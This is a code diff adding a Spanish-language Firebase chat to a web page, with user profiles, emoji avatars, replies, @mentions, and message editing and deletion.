+        else{ chatDisplayName=email.split('@')[0]; chatAvatar="🦁"; await perfilRef.set({name:chatDisplayName, avatar:chatAvatar}); }
+        document.getElementById('displayName').value=chatDisplayName;
+        document.getElementById('avatarSelect').textContent=chatAvatar;
+    }
+    document.getElementById('saveProfileBtn').addEventListener('click', async()=>{
+        const newName=document.getElementById('displayName').value.trim();
+        if(newName) chatDisplayName=newName;
+        chatAvatar=document.getElementById('avatarSelect').textContent;
+        await db.ref(`chat_profiles/${currentUser.uid}`).set({name:chatDisplayName, avatar:chatAvatar});
+        alert("Perfil actualizado");
+    });
+    document.getElementById('avatarSelect').addEventListener('click',()=>{
+        let newEmoji=prompt("Elige un emoji (puedes copiar y pegar):", chatAvatar);
+        if(newEmoji && newEmoji.trim()) document.getElementById('avatarSelect').textContent=newEmoji.trim();
+    });
+    let chatUnsubscribe=null;
+    function iniciarChat(){
+        if(chatUnsubscribe) chatUnsubscribe();
+        const messagesRef = db.ref('chat_messages').orderByChild('timestamp').limitToLast(200);
+        chatUnsubscribe = messagesRef.on('value', (snapshot)=>{
+            const messages=[];
+            snapshot.forEach(child=>{ messages.push({id:child.key, ...child.val()}); });
+            messages.sort((a,b)=>(a.timestamp||0)-(b.timestamp||0));
+            renderizarMensajes(messages);
+        });
+    }
+    async function renderizarMensajes(messages){
+        const container=document.getElementById('chatMessages');
+        if(!container) return;
+        container.innerHTML='';
+        for(const msg of messages){
+            const userColor=getUserColor(msg.userId);
+            const replyHtml=msg.replyTo?`<div class="reply-preview">↩️ Respondiendo a <strong style="color:${getUserColor(msg.replyTo.userId)}">${escapeHtml(msg.replyTo.userName)}</strong>: ${escapeHtml(msg.replyTo.text.substring(0,50))}</div>`:'';
+            const msgDiv=document.createElement('div');
+            msgDiv.className=`chat-message ${msg.replyTo?'replying':''}`;
+            msgDiv.style.setProperty('--user-color', userColor);
+            msgDiv.dataset.id=msg.id;
+            msgDiv.innerHTML=`
+                <div class="message-header">
+                    <span class="message-avatar">${escapeHtml(msg.avatar||'🦁')}</span>
+                    <span class="message-name" style="color:${userColor}">${escapeHtml(msg.userName)}</span>
+                    <span class="message-time">${new Date(msg.timestamp).toLocaleString()}</span>
+                </div>
+                ${replyHtml}
+                <div class="message-text">${formatMessageText(msg.text, msg.mentions||[])}</div>
+                <div class="message-actions">
+                    <button class="msg-btn reply-btn" title="Responder">💬</button>
+                    ${(currentUser.role==='Owner' || msg.userId===currentUser.uid)?`<button class="msg-btn edit-btn" title="Editar">✏️</button><button class="msg-btn delete-btn" title="Eliminar">🗑️</button>`:''}
+                </div>
+            `;
+            msgDiv.querySelector('.reply-btn').onclick=()=>{ currentReplyTo={ id:msg.id, userName:msg.userName, text:msg.text }; document.getElementById('replyBadge').style.display='flex'; document.getElementById('replyBadge').querySelector('span').innerHTML=`Respondiendo a ${escapeHtml(msg.userName)}: ${escapeHtml(msg.text.substring(0,40))}`; };
+            if(msgDiv.querySelector('.edit-btn')) msgDiv.querySelector('.edit-btn').onclick=()=>editarMensaje(msg.id, msg.text);
+            if(msgDiv.querySelector('.delete-btn')) msgDiv.querySelector('.delete-btn').onclick=()=>eliminarMensaje(msg.id);
+            container.appendChild(msgDiv);
+        }
+        container.scrollTop=container.scrollHeight;
+    }
+    function escapeHtml(str){ return str.replace(/[&<>]/g, function(m){ if(m==='&') return '&amp;'; if(m==='<') return '&lt;'; if(m==='>') return '&gt;'; return m;}); }
+    function formatMessageText(text, mentions){
+        let html=escapeHtml(text);
+        mentions.forEach(m=>{
+            const regex=new RegExp(`@${m.userName.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}\\b`, 'g');
+            html=html.replace(regex, `<span class="mention" data-userid="${m.userId}">@${escapeHtml(m.userName)}</span>`);
+        });
+        return html;
+    }
+    async function enviarMensaje(){
+        const input=document.getElementById('chatInput');
+        let text=input.value.trim();
+        if(!text) return;
+        const mentionRegex=/@(\w+)/g;
+        let match;
+        const mentions=[];
+        while((match=mentionRegex.exec(text))!==null){
+            const mentionedName=match[1];
+            const snapshot=await db.ref('chat_profiles').once('value');
+            let found=null;
+            snapshot.forEach(prof=>{
+                if(prof.val().name.toLowerCase()===mentionedName.toLowerCase()) found={ userId:prof.key, userName:prof.val().name };
+            });
+            if(found && !mentions.some(m=>m.userId===found.userId)) mentions.push(found);
+        }
+        const msgData={ userId:currentUser.uid, userName:chatDisplayName, avatar:chatAvatar, text:text, timestamp:Date.now(), mentions:mentions };
+        if(currentReplyTo){ msgData.replyTo={ id:currentReplyTo.id, userId:currentReplyTo.userId, userName:currentReplyTo.userName, text:currentReplyTo.text.substring(0,100) }; currentReplyTo=null; document.getElementById('replyBadge').style.display='none'; }
+        await db.ref('chat_messages').push(msgData);
+        input.value='';
+    }
+    async function editarMensaje(msgId, oldText){
+        const newText=prompt("Editar mensaje:", oldText);
+        if(newText && newText!==oldText) await db.ref(`chat_messages/${msgId}`).update({ text:newText, edited:true });
+    }
+    async function eliminarMensaje(msgId){
+        if(confirm("¿Eliminar este mensaje?")) await db.ref(`chat_messages/${msgId}`).remove();
+    }
+    document.getElementById('sendMsgBtn').addEventListener('click', enviarMensaje);
+    document.getElementById('chatInput').addEventListener('keypress', (e)=>{ if(e.key==='Enter' && !e.shiftKey){ e.preventDefault(); enviarMensaje(); } });
+    document.getElementById('cancelReplyBtn').addEventListener('click', ()=>{ currentReplyTo=null; document.getElementById('replyBadge').style.display='none'; });
+    function cargarMensajesChat(){} // ya se actualiza en tiempo real
 </script>
 </body>
 </html>
